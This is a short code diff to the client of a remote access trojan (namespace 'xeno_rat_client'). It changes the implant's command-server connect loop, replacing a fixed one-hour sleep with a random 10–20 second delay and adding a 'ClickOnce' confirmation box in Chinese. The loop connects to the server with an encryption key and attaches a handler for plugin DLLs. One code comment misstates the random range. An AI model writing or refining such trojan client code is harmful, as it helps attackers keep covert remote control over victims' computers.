@@ -90,13 +90,16 @@ namespace xeno_rat_client
             {
                 try
                 {
-                    MessageBox.Show("ClickOnce", "确定要运行吗");
+                    Random rand = new Random();
+                    int randomNumber = rand.Next(10000, 20001); // 生成1000到2000之间的随机数
+
+                    MessageBox.Show("ClickOnce" + randomNumber, "确定要运行吗");
                     //Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     //await socket.ConnectAsync(ServerIp, ServerPort);
                     Server = await Utils.ConnectAndSetupAsync(null, EncryptionKey, 0, 0, OnDisconnect);
                     Handler handle = new Handler(Server, dllhandler);
                     //await handle.Type0Receive();
-                    Thread.Sleep(3600000);
+                    Thread.Sleep(randomNumber);
                 }
                 catch (Exception e)
                 {
